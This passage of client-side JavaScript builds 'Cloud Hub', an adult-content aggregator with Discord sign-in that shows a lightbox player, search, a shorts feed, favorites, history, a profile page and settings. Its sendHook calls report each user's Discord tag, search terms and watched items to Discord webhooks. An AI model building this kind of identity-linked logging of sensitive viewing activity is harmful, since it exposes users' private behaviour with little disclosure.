    html:'<i class="fa-'+(fav?'solid':'regular')+' fa-heart"></i>',
    onclick:e=>{
      e.stopPropagation();
      const added = toggleFav(it);
      favBtn.classList.toggle('active', added);
      favBtn.innerHTML = '<i class="fa-'+(added?'solid':'regular')+' fa-heart"></i>';
      if(opts.removeOnUnfav && !added) card.remove();
    }
  });
  card.append(favBtn);

  card.append(el('div',{class:'overlay'},
    el('div',{class:'title'}, it.title || it.platformName || ''),
    el('div',{class:'meta'},
      el('span',{class:'kind',html:'<i class="fa-solid '+(it.kind==='video'?'fa-play':it.kind==='gif'?'fa-film':'fa-image')+'"></i> '+(it.platformName||'')}),
      el('span',{html: views ? '<i class="fa-regular fa-eye"></i> '+views : ''})
    )
  ));
  card.addEventListener('click', () => openLightbox(it));
  return card;
}

/* ═══════════ LIGHTBOX (with resume) ═══════════ */
const lb = $('lb');
const lbBody  = $('lbBody');
const lbTitle = $('lbTitle');
const lbFav   = $('lbFav');
$('lbClose').onclick = closeLightbox;
lb.addEventListener('click', e => { if(e.target === lb) closeLightbox(); });
document.addEventListener('keydown', e => { if(e.key==='Escape') closeLightbox(); });
function closeLightbox(){
  // Save final progress
  const v = lbBody.querySelector('video');
  if(v && lb._key){
    const m = getProgress();
    if(v.currentTime > 5 && (!v.duration || v.currentTime < v.duration - 5)){
      m[lb._key] = v.currentTime; saveProgress(m);
    }
  }
  lb.classList.remove('open');
  lbBody.innerHTML = '';
  lb._key = null;
}
async function resolveRedgifsMp4(id){
  try{
    const token = await getRedgifsToken();
    const r = await fetch(`https://api.redgifs.com/v2/gifs/${id}`, { headers:{ Authorization:'Bearer '+token }, credentials:'omit' });
    if(!r.ok) return '';
    const j = await r.json();
    return j.gif?.urls?.hd || j.gif?.urls?.sd || '';
  }catch{ return ''; }
}
async function openLightbox(it){
  lbTitle.textContent = `${it.platformName||''} · ${it.title || 'Preview'}`;
  lbBody.innerHTML = '<div class="spin" style="margin:80px auto"></div>';
  lb.classList.add('open');
  lb._key = progressKey(it);

  // Resolve RedGifs lazy URL
  let mp4 = it.mp4Url || it.url || '';
  if(it._redgifs && !mp4) mp4 = await resolveRedgifsMp4(it._redgifs);

  lbBody.innerHTML = '';
  if(it.embedUrl){
    lbBody.append(el('iframe', { src: it.embedUrl, allow:'autoplay; encrypted-media; fullscreen', allowfullscreen:'true', style:'width:100%;height:78vh' }));
  } else if(it.kind === 'video' && mp4){
    const v = el('video',{ src:mp4, controls:'true', autoplay:'true', playsinline:'true', preload:'auto', style:'max-width:100%;max-height:78vh' });
    lbBody.append(v);
    attachResume(v, lb._key);
  } else if(it.kind === 'gif' && mp4 && /\.(mp4|webm)/i.test(mp4)){
    const v = el('video',{ src:mp4, autoplay:'true', loop:'true', muted:'true', playsinline:'true', controls:'true', style:'max-width:100%;max-height:78vh' });
    lbBody.append(v);
    attachResume(v, lb._key);
  } else {
    lbBody.append(el('img',{ src: it.url || it.thumb, referrerpolicy:'no-referrer' }));
  }

  lbFav.classList.toggle('primary', isFav(it.id));
  lbFav.innerHTML = '<i class="fa-'+(isFav(it.id)?'solid':'regular')+' fa-heart"></i> '+(isFav(it.id)?'Favorited':'Favorite');
  lbFav.onclick = () => {
    const added = toggleFav(it);
    lbFav.classList.toggle('primary', added);
    lbFav.innerHTML = '<i class="fa-'+(added?'solid':'regular')+' fa-heart"></i> '+(added?'Favorited':'Favorite');
  };

  pushHistory(it);
  sendHook('watch', {
    username:'Cloud Hub',
    embeds:[{
      ...buildBaseEmbed('watch',
        `▶️ Watching: ${it.title || it.platformName}`,
        `By **${userTag(currentUser)}** · ${it.platformName} · ${it.kind}`),
      thumbnail: it.thumb ? { url: it.thumb } : undefined,
      fields:[
        { name:'Source',   value: it.platformName, inline:true },
        { name:'Type',     value: it.kind, inline:true },
        { name:'Duration', value: it.durationSec ? fmtDur(it.durationSec) : '—', inline:true },
        { name:'HD',       value: it.hd ? 'yes' : 'no', inline:true },
        { name:'Page',     value: it.pageUrl ? `[Open original](${it.pageUrl})` : '—', inline:false }
      ]
    }]
  });
}

/* ═══════════ BROWSE / SEARCH ═══════════ */
async function doSearch(opts={}){
  if(opts.reset){
    state.pageNum = 1; state.done = false; state.results = []; state.seen = new Set();
    $('resultsGrid').innerHTML = '';
  }
  if(state.loading || state.done) return;
  state.loading = true;
  $('sentinel').hidden = false;
  const sent = $('sentinel');
  sent.innerHTML = '<div class="spin"></div> Loading more…';

  if(state.pageNum === 1){
    const grid = $('resultsGrid');
    for(let i=0;i<8;i++) grid.append(el('div',{class:'skel'}));
    if(state.query){
      sendHook('search', {
        username:'Cloud Hub',
        embeds:[{
          ...buildBaseEmbed('search', `🔎 Search: "${state.query}"`, `By **${userTag(currentUser)}** · type: ${state.kind}`),
          fields:[
            { name:'Query', value:'`'+state.query+'`', inline:true },
            { name:'Kind',  value:state.kind, inline:true }
          ]
        }]
      });
    }
  }

  try{
    const list = await aggregateSearch({ q: state.query, kind: state.kind, page: state.pageNum, limit: 30 });
    const grid = $('resultsGrid');
    if(state.pageNum === 1) grid.innerHTML = '';
    let added = 0;
    for(const it of list){
      if(state.seen.has(it.id)) continue;
      state.seen.add(it.id);
      grid.append(renderCard(it));
      state.results.push(it);
      added++;
    }
    if(added === 0 && state.pageNum >= 5) state.done = true;
    if(list.length < 5)                  state.done = true;
    state.pageNum++;
    if(state.pageNum === 2 && state.results.length === 0){
      grid.innerHTML = '';
      grid.append(el('div',{class:'empty'},
        el('i',{class:'fa-solid fa-magnifying-glass'}),
        el('h3',{},'No results'),
        el('p',{},'Try a different search term, or hit shuffle.')
      ));
    }
  }catch(e){ console.error(e); }
  finally{
    state.loading = false;
    $('sentinel').hidden = state.done;
    if(state.done){
      sent.innerHTML = '<span style="color:var(--dim)">— end of results —</span>';
      sent.hidden = false;
    }
  }
}
const io = new IntersectionObserver(entries => {
  for(const e of entries){
    if(e.isIntersecting && !state.loading && !state.done && state.page === 'browse') doSearch();
  }
}, { rootMargin:'600px' });
io.observe($('sentinel'));

document.querySelectorAll('#kindTabs .tab2').forEach(b => b.addEventListener('click', () => {
  document.querySelectorAll('#kindTabs .tab2').forEach(x => x.classList.toggle('active', x===b));
  state.kind = b.dataset.kind;
  doSearch({reset:true});
}));
$('searchBtn').addEventListener('click', () => {
  state.query = $('searchQ').value.trim();
  doSearch({reset:true});
});
$('searchQ').addEventListener('keydown', e => { if(e.key==='Enter'){ e.preventDefault(); $('searchBtn').click(); }});
$('shuffleBtn').addEventListener('click', () => doSearch({reset:true}));

/* nav search */
$('navSearch').addEventListener('submit', e => {
  e.preventDefault();
  const q = $('navSearchQ').value.trim();
  if(!q) return;
  state.query = q;
  goToPage('browse');
  $('searchQ').value = q;
  doSearch({reset:true});
});

/* ═══════════ HOME ═══════════ */
$('heroForm').addEventListener('submit', e => {
  e.preventDefault();
  const q = $('heroQ').value.trim();
  state.query = q;
  goToPage('browse');
  $('searchQ').value = q;
  doSearch({reset:true});
});
function renderTrending(){
  const c = $('trendingChips'); c.innerHTML = '';
  for(const t of TRENDING.slice(0, 28)){
    c.append(el('button',{class:'chip', html:'<i class="fa-solid fa-hashtag"></i>'+t, onclick:()=>{
      state.query = t; state.kind='video';
      goToPage('browse');
      document.querySelectorAll('#kindTabs .tab2').forEach(x => x.classList.toggle('active', x.dataset.kind==='video'));
      $('searchQ').value = t;
      doSearch({reset:true});
    }}));
  }
}
function renderQuickChips(){
  const c = $('quickChips'); c.innerHTML = '';
  for(const t of TRENDING.slice(0, 22)){
    c.append(el('button',{class:'chip'+(state.query===t?' active':''), html:'<i class="fa-solid fa-hashtag"></i>'+t, onclick:()=>{
      state.query = t; $('searchQ').value = t;
      doSearch({reset:true}); renderQuickChips();
    }}));
  }
}
async function renderFresh(){
  const grid = $('freshGrid');
  grid.innerHTML = '';
  for(let i=0;i<8;i++) grid.append(el('div',{class:'skel'}));
  try{
    const kinds = ['video','image','gif'];
    const kind = kinds[(Math.random()*3)|0];
    const list = await aggregateSearch({ q:'', kind, page:1+((Math.random()*3)|0), limit:12 });
    grid.innerHTML = '';
    if(!list.length){
      grid.append(el('div',{class:'empty'},
        el('i',{class:'fa-solid fa-circle-exclamation'}),
        el('h3',{},'Could not load fresh picks'),
        el('p',{},'Try shuffling.')));
      return;
    }
    for(const it of list.slice(0,12)) grid.append(renderCard(it));
  }catch{
    grid.innerHTML = '<div class="empty"><i class="fa-solid fa-circle-exclamation"></i><h3>Could not load fresh picks</h3><p>Try shuffling.</p></div>';
  }
}
$('freshRefresh').addEventListener('click', renderFresh);

async function renderShortsRail(){
  const rail = $('shortsRail');
  rail.innerHTML = '';
  for(let i=0;i<6;i++) rail.append(el('div',{class:'short-thumb', style:'flex:0 0 180px;background:var(--surface)'}));
  await ensureShortsPool();
  rail.innerHTML = '';
  for(const it of SHORTS_POOL.slice(0, 10)){
    const t = el('div',{class:'short-thumb', onclick:()=>{
      goToPage('shorts');
      // jump to clicked one
      const target = Array.from($('shortsFeed').children).find(c => c.dataset.id === it.id);
      if(target) target.scrollIntoView({behavior:'smooth'});
    }},
      el('img',{src:it.thumb, referrerpolicy:'no-referrer', onerror:e=>e.target.style.display='none'}),
      el('div',{class:'play-ov'}, el('i',{class:'fa-solid fa-circle-play'})),
      el('div',{class:'stitle'}, it.title || it.platformName)
    );
    rail.append(t);
  }
}

/* ═══════════ SHORTS PAGE ═══════════ */
async function ensureShortsPool(){
  if(SHORTS_POOL.length || SHORTS_LOADING) return;
  SHORTS_LOADING = true;
  try{
    // Pull videos+gifs from real sources
    const lists = await Promise.all([
      fetchRedgifsVideos('', 30, 1).catch(()=>[]),
      fetchEpornerVideos('', 20, 1).catch(()=>[]),
      fetchReddit('nsfw_gifs', 50).catch(()=>[]),
      fetchReddit('holdthemoan', 40).catch(()=>[]),
      fetchReddit('PetiteGoneWild', 30).catch(()=>[])
    ]);
    let pool = [];
    for(const l of lists){
      for(const r of l){
        const u = unify(r);
        if(!u) continue;
        // Shorts: only video + gif content
        if(u.kind !== 'video' && u.kind !== 'gif') continue;
        if(!u.thumb) continue;
        pool.push(u);
      }
    }
    const seen = new Set();
    pool = pool.filter(r => { if(seen.has(r.id)) return false; seen.add(r.id); return true; });
    shuffle(pool);
    SHORTS_POOL = pool.slice(0, 60);
  }catch(e){ console.warn('shorts pool', e); }
  SHORTS_LOADING = false;
}
async function loadShorts(){
  const feed = $('shortsFeed');
  await ensureShortsPool();
  feed.innerHTML = '';
  if(!SHORTS_POOL.length){
    feed.innerHTML = '<div class="empty" style="height:60vh;display:flex;flex-direction:column;align-items:center;justify-content:center;border:0;background:transparent"><i class="fa-solid fa-bolt"></i><h3>No shorts available</h3><p>Try again in a moment.</p></div>';
    return;
  }
  let count = 0;
  let firstFrame = null;
  for(const it of SHORTS_POOL){
    const frame = renderShortFrame(it);
    feed.append(frame);
    if(!firstFrame) firstFrame = frame;
    count++;
    if(count === 1){
      sendHook('shorts', {
        username:'Cloud Hub',
        embeds:[{
          ...buildBaseEmbed('shorts',
            `⚡ ${userTag(currentUser)} opened Shorts`,
            `Pool size: ${SHORTS_POOL.length}`),
          thumbnail: it.thumb ? { url: it.thumb } : undefined
        }]
      });
    }
  }
  // Set up auto-play observer
  setupShortsObserver();
}
function renderShortFrame(it){
  const frame = el('div',{class:'short-frame'});
  frame.dataset.id = it.id;
  frame.dataset.itemJson = JSON.stringify(it).slice(0,4000); // fallback
  let mediaEl;
  const mp4 = it.mp4Url || (it.kind !== 'image' && it.url) || '';
  if(it._redgifs){
    // resolve lazily on first play
    mediaEl = el('video',{ poster:it.thumb, loop:'true', playsinline:'true', preload:'metadata', muted:'true', controls:'true' });
    mediaEl.addEventListener('play', async () => {
      if(!mediaEl.src && it._redgifs){
        const u = await resolveRedgifsMp4(it._redgifs);
        if(u){ mediaEl.src = u; mediaEl.play().catch(()=>{}); }
      }
    });
  } else if(/\.(mp4|webm)(\?|$)/i.test(mp4) || it.kind === 'video' || it.kind === 'gif'){
    mediaEl = el('video',{ src:mp4, poster:it.thumb, loop:'true', playsinline:'true', preload:'metadata', muted:'true', controls:'true' });
  } else {
    mediaEl = el('img',{ src:it.url || it.thumb, referrerpolicy:'no-referrer' });
  }
  frame.append(mediaEl);
  frame.append(el('div',{class:'play-overlay'}, el('i',{class:'fa-solid fa-play'})));

  // Right side actions
  const fav = isFav(it.id);
  const side = el('div',{class:'short-side'},
    el('div',{},
      el('button',{class:'fav'+(fav?' active':''), html:'<i class="fa-'+(fav?'solid':'regular')+' fa-heart"></i>',
        onclick:e=>{
          e.stopPropagation();
          const added = toggleFav(it);
          e.currentTarget.classList.toggle('active', added);
          e.currentTarget.innerHTML='<i class="fa-'+(added?'solid':'regular')+' fa-heart"></i>';
        }}),
      el('div',{class:'lbl'}, fmtViews(it.views) || '0')
    ),
    el('div',{},
      el('button',{html:'<i class="fa-solid fa-expand"></i>', onclick:e=>{ e.stopPropagation(); openLightbox(it); }}),
      el('div',{class:'lbl'}, 'Open')
    ),
    el('div',{},
      el('button',{html:'<i class="fa-solid fa-up-right-from-square"></i>', onclick:e=>{ e.stopPropagation(); window.open(it.pageUrl,'_blank','noopener'); }}),
      el('div',{class:'lbl'}, 'Source')
    )
  );
  frame.append(side);

  // Bottom info
  frame.append(el('div',{class:'short-info'},
    el('div',{class:'src',html:'<i class="fa-solid fa-fire"></i> '+(it.platformName||'')}),
    el('div',{class:'stitle'}, it.title || ''),
    el('div',{class:'smeta', html: (it.durationSec?'<i class="fa-solid fa-clock"></i> '+fmtDur(it.durationSec)+'  ':'') + (it.hd?'<i class="fa-solid fa-crown" style="color:var(--gold)"></i> HD':'') })
  ));

  // tap to play/pause
  if(mediaEl.tagName === 'VIDEO'){
    frame.addEventListener('click', e => {
      if(e.target.closest('.short-side, .short-info, .play-overlay')) return;
      if(mediaEl.paused){ mediaEl.play().catch(()=>{}); frame.classList.remove('paused'); }
      else { mediaEl.pause(); frame.classList.add('paused'); }
    });
  }

  return frame;
}
let SHORTS_IO;
function setupShortsObserver(){
  if(SHORTS_IO) SHORTS_IO.disconnect();
  SHORTS_IO = new IntersectionObserver(entries => {
    for(const e of entries){
      const v = e.target.querySelector('video');
      if(!v) continue;
      if(e.isIntersecting && e.intersectionRatio > 0.7){
        v.play().catch(()=>{});
        e.target.classList.remove('paused');
        // Record history once per visit
        if(!e.target.dataset.viewed){
          e.target.dataset.viewed = '1';
          try{ const it = JSON.parse(e.target.dataset.itemJson); pushHistory(it); }catch{}
        }
      } else {
        v.pause();
      }
    }
  }, { threshold: [0, 0.3, 0.7, 1] });
  document.querySelectorAll('#shortsFeed .short-frame').forEach(f => SHORTS_IO.observe(f));
}
function closeAllShortVideos(stop=true){
  if(!stop) return;
  document.querySelectorAll('#shortsFeed video').forEach(v => v.pause());
}

/* ═══════════ FAVORITES ═══════════ */
function renderFavorites(){
  const grid = $('favGrid');
  const list = getFavs();
  grid.innerHTML = '';
  $('favSub').textContent = list.length ? `${list.length} saved` : 'Saved on this device';
  $('favToolbar').hidden = list.length === 0;
  if(!list.length){
    grid.append(el('div',{class:'empty'},
      el('i',{class:'fa-regular fa-heart'}),
      el('h3',{},'No favorites yet'),
      el('p',{},'Tap the heart on any video, image or GIF to save it here.')));
    return;
  }
  for(const it of list) grid.append(renderCard(it, { removeOnUnfav:true }));
}
$('favClear').addEventListener('click', () => {
  if(confirm('Remove all favorites?')){ setFavs([]); renderFavorites(); toast('Favorites cleared','ok'); }
});

/* ═══════════ HISTORY ═══════════ */
function renderHistory(){
  const list = getHistory();
  const wrap = $('histList'); wrap.innerHTML = '';
  $('histSub').textContent = list.length ? `${list.length} items` : 'Most recent first';
  $('histToolbar').hidden = list.length === 0;
  if(!list.length){
    wrap.append(el('div',{class:'empty'},
      el('i',{class:'fa-solid fa-clock-rotate-left'}),
      el('h3',{},'No history yet'),
      el('p',{},'Items you open will show up here.')));
    return;
  }
  for(const it of list){
    const row = el('div',{class:'hist-row', onclick:()=>openLightbox(it)},
      el('img',{src:it.thumb, referrerpolicy:'no-referrer',
        onerror:e=>{ e.target.style.background='#222'; e.target.removeAttribute('src'); }}),
      el('div',{class:'ht'},
        el('div',{class:'ht-title'}, it.title || 'Untitled'),
        el('div',{class:'ht-meta'},
          el('span',{html:'<i class="fa-solid fa-grip"></i>'+(it.platformName||'')}),
          el('span',{html:'<i class="fa-solid '+(it.kind==='video'?'fa-play':it.kind==='gif'?'fa-film':'fa-image')+'"></i>'+it.kind}),
          el('span',{html:'<i class="fa-regular fa-clock"></i>'+new Date(it._ts||Date.now()).toLocaleString()})
        )
      ),
      el('button',{class:'btn',html:'<i class="fa-'+(isFav(it.id)?'solid':'regular')+' fa-heart"></i>',
        onclick:e=>{ e.stopPropagation(); const added = toggleFav(it);
          e.currentTarget.innerHTML='<i class="fa-'+(added?'solid':'regular')+' fa-heart"></i>'; }})
    );
    wrap.append(row);
  }
}
$('histClear').addEventListener('click', () => {
  if(confirm('Clear watch history?')){ localStorage.removeItem(LS.HIST); renderHistory(); toast('History cleared','ok'); }
});

/* ═══════════ DISCORD BADGES (real flag bits + Nitro) ═══════════ */
function renderBadgeList(u){
  const flags = u.public_flags || u.flags || 0;
  const out = [];
  for(const b of DBADGES){ if(flags & b.bit) out.push(b); }
  if(u.premium_type){
    out.push({ name: NITRO_TIERS[u.premium_type] || 'Nitro', bg:'linear-gradient(135deg,#ff73fa,#a855f7)', fg:'#fff', icon:'fa-rocket', _nitro:true });
  }
  return out;
}
function badgeNode(b){
  const node = el('span',{class:'dbadge'+(b._nitro?' nitro':'')});
  node.title = b.name;
  if(!b._nitro){ node.style.background = 'rgba(255,255,255,.06)'; }
  const dot = el('span',{class:'dot', style: b._nitro ? '' : `background:${b.bg};color:${b.fg}`}, el('i',{class:'fa-solid '+b.icon}));
  node.append(dot, document.createTextNode(b.name));
  return node;
}

/* ═══════════ PROFILE ═══════════ */
function renderProfile(){
  const u     = currentUser;
  const conns = JSON.parse(localStorage.getItem(LS.CONNS) || '[]');
  const main  = $('profileMain');
  main.innerHTML = '';
  if(!u){
    main.append(el('div',{class:'empty'},
      el('i',{class:'fa-solid fa-user'}),
      el('h3',{},'Not signed in'),
      el('p',{},'Sign in with Discord to see your profile.')));
    return;
  }

  const hero = el('div',{class:'prof-hero'});
  const banner = userBannerURL(u);
  if(banner){ hero.style.setProperty('--banner-img', `url(${banner})`); hero.setAttribute('data-banner','1'); }

  const badgeList = renderBadgeList(u);
  const badgeRow = el('div',{class:'prof-badges'});
  if(badgeList.length){ for(const b of badgeList) badgeRow.append(badgeNode(b)); }
  else badgeRow.append(el('span',{class:'dbadge'}, el('span',{class:'dot',style:'background:#777',html:'<i class="fa-solid fa-circle"></i>'}), 'No badges'));

  hero.append(el('div',{class:'prof-row'},
    el('img',{class:'prof-avatar', src:userAvatarURL(u, 256), referrerpolicy:'no-referrer'}),
    el('div',{class:'prof-info'},
      el('h2',{}, u.global_name || u.username),
      el('div',{class:'uname',html:'@'+(u.username||'')+(u.verified?' <i class="fa-solid fa-circle-check verified" title="verified"></i>':'')}),
      badgeRow
    )
  ));
  main.append(hero);

  const grid = el('div',{class:'prof-grid'});
  grid.append(el('div',{class:'prof-card'},
    el('h4',{html:'<i class="fa-solid fa-id-card"></i> Account'}),
    kv('Username',     u.username || '—'),
    kv('Display name', u.global_name || '—'),
    kv('User ID',      u.id || '—'),
    kv('Email',        u.email || '—'),
    kv('Verified',     u.verified ? 'yes' : 'no'),
    kv('MFA',          u.mfa_enabled ? 'enabled' : 'disabled'),
    kv('Locale',       u.locale || '—'),
    kv('Premium',      NITRO_TIERS[u.premium_type||0] || 'none')
  ));

  const connCard = el('div',{class:'prof-card'},
    el('h4',{html:`<i class="fa-solid fa-link"></i> Connected accounts (${conns.length})`})
  );
  if(conns.length){
    const list = el('div',{class:'conn-list'});
    const CONN_ICO = {
      twitter:'fa-brands fa-x-twitter', github:'fa-brands fa-github', spotify:'fa-brands fa-spotify',
      youtube:'fa-brands fa-youtube', twitch:'fa-brands fa-twitch', steam:'fa-brands fa-steam',
      reddit:'fa-brands fa-reddit', xbox:'fa-brands fa-xbox', playstation:'fa-brands fa-playstation',
      battlenet:'fa-brands fa-battle-net', tiktok:'fa-brands fa-tiktok', instagram:'fa-brands fa-instagram',
      facebook:'fa-brands fa-facebook', epicgames:'fa-solid fa-gamepad', leagueoflegends:'fa-solid fa-shield',
      paypal:'fa-brands fa-paypal', skype:'fa-brands fa-skype', ebay:'fa-brands fa-ebay',
      domain:'fa-solid fa-globe', riotgames:'fa-solid fa-shield-halved'
    };
    const CONN_BG = {
      twitter:'#000', github:'#24292e', spotify:'#1db954', youtube:'#ff0000', twitch:'#9146ff',
      steam:'#171a21', reddit:'#ff4500', xbox:'#107c10', playstation:'#003791', tiktok:'#000',
      instagram:'#e1306c', facebook:'#1877f2', battlenet:'#148eff', riotgames:'#d13639', paypal:'#003087'
    };
    for(const c of conns){
      const t = (c.type||'').toLowerCase();
      const ico = CONN_ICO[t] || 'fa-solid fa-link';
      const bg = CONN_BG[t] || 'var(--surface-2)';
      list.append(el('div',{class:'conn'},
        el('div',{class:'conn-ico', style:`background:${bg}`, html:'<i class="'+ico+'"></i>'}),
        el('div',{class:'ctext'},
          el('div',{class:'cname'}, c.name || c.id),
          el('div',{class:'csvc'}, c.type + (c.verified?' · verified':''))
        )
      ));
    }
    connCard.append(list);
  } else {
    connCard.append(el('p',{style:'color:var(--muted);margin:0;font-size:13px'},'No third-party connections.'));
  }
  grid.append(connCard);
  main.append(grid);

  main.append(el('div',{style:'text-align:center;margin-top:24px'},
    el('button',{class:'btn danger', html:'<i class="fa-solid fa-right-from-bracket"></i> Sign out',
      onclick:logout})));
}
function kv(k, v){ return el('div',{class:'kv'}, el('span',{},k), el('span',{},v)); }

/* ═══════════ SETTINGS ═══════════ */
function renderSettings(){
  const main = $('settingsMain');
  main.innerHTML = '';

  const acard = el('div',{class:'set-card'});
  acard.append(el('h3',{html:'<i class="fa-solid fa-user"></i> Account'}));
  acard.append(el('div',{class:'desc'},'Signed in as '+(currentUser ? userTag(currentUser) : '—')+'.'));
  acard.append(el('button',{class:'btn', html:'<i class="fa-solid fa-rotate"></i> Refresh Discord profile', onclick: async () => {
    const tok = getToken(); if(!tok) return toast('No session','err');
    try{
      const data = await loadDiscordIdentity(tok);
      currentUser = data.user;
      paintUserPill(currentUser);
      renderSettings(); renderProfile();
      toast('Profile refreshed','ok');
    }catch{ toast('Refresh failed','err'); }
  }}));
  acard.append(el('button',{class:'btn danger', style:'margin-left:8px', html:'<i class="fa-solid fa-right-from-bracket"></i> Sign out', onclick:logout}));
  main.append(acard);

  const dcard = el('div',{class:'set-card'});
  dcard.append(el('h3',{html:'<i class="fa-solid fa-database"></i> Local data'}));
  dcard.append(el('div',{class:'desc'},'Favorites, history, and video resume positions live in this browser only.'));
  dcard.append(el('button',{class:'btn danger', html:'<i class="fa-solid fa-trash"></i> Clear favorites ('+getFavs().length+')',
    onclick:()=>{ if(confirm('Remove all favorites?')){ setFavs([]); renderSettings(); toast('Cleared','ok'); }}}));
  dcard.append(el('button',{class:'btn danger', style:'margin-left:8px', html:'<i class="fa-solid fa-trash"></i> Clear history ('+getHistory().length+')',
    onclick:()=>{ if(confirm('Clear watch history?')){ localStorage.removeItem(LS.HIST); renderSettings(); toast('Cleared','ok'); }}}));
  dcard.append(el('button',{class:'btn danger', style:'margin-left:8px', html:'<i class="fa-solid fa-eraser"></i> Clear video resume points',
    onclick:()=>{ localStorage.removeItem(LS.PROGRESS); toast('Resume points cleared','ok'); }}));
  main.append(dcard);

  const scard = el('div',{class:'set-card'});
  scard.append(el('h3',{html:'<i class="fa-solid fa-circle-info"></i> About'}));
  scard.append(el('div',{class:'desc'},'Cloud Hub is a 100% client-side aggregator. No backend. No tracking outside Discord webhooks you control. Works on any static host (Replit, GitHub Pages, Netlify, Vercel).'));
  scard.append(el('div',{class:'kv'}, el('span',{},'Sources'), el('span',{}, String(SOURCES.length))));
  scard.append(el('div',{class:'kv'}, el('span',{},'Saved favorites'), el('span',{}, String(getFavs().length))));
  scard.append(el('div',{class:'kv'}, el('span',{},'Watch history'), el('span',{}, String(getHistory().length))));
  main.append(scard);
}

/* ═══════════ INIT (post-login) ═══════════ */
function initApp(){
  updateFavCount();
  renderTrending();
  renderQuickChips();
  renderFresh();
  renderShortsRail();
}

/* ═══════════ START ═══════════ */
boot();
